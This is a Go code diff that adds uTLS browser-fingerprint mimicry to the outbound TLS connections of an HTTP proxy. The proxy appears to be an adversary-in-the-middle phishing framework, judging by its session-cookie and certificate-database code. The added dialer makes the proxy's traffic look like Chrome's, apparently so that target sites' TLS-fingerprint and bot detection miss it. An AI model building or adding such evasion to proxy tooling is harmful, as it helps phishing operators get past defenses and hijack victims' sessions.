@@ -31,6 +31,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	utls "github.com/refraction-networking/utls"
 
 	"golang.org/x/net/proxy"
 
@@ -143,6 +144,37 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
+	// --- START uTLS FINGERPRINT MIMICRY ---
+	// Override the proxy transport to use uTLS for outbound connections
+	if p.Proxy.Tr != nil {
+		p.Proxy.Tr.DialTLS = func(network, addr string) (net.Conn, error) {
+			dialer := net.Dialer{Timeout: 30 * time.Second}
+			tcpConn, err := dialer.Dial(network, addr)
+			if err != nil {
+				return nil, err
+			}
+
+			// Extract hostname for SNI
+			host, _, _ := net.SplitHostPort(addr)
+			
+			// Configure uTLS to mimic a specific browser (e.g., Chrome)
+			uConfig := &utls.Config{
+				ServerName: host,
+				// InsecureSkipVerify: true, // Uncomment if testing against self-signed certs
+			}
+			
+			// HelloChrome_Auto randomizes the fingerprint slightly to look like a modern Chrome version
+			uConn := utls.UClient(tcpConn, uConfig, utls.HelloChrome_Auto)
+			
+			if err := uConn.Handshake(); err != nil {
+				_ = tcpConn.Close()
+				return nil, err
+			}
+			
+			return uConn, nil
+		}
+	}
+	// --- END uTLS FINGERPRINT MIMICRY ---
 
 	p.Proxy.Verbose = false
 
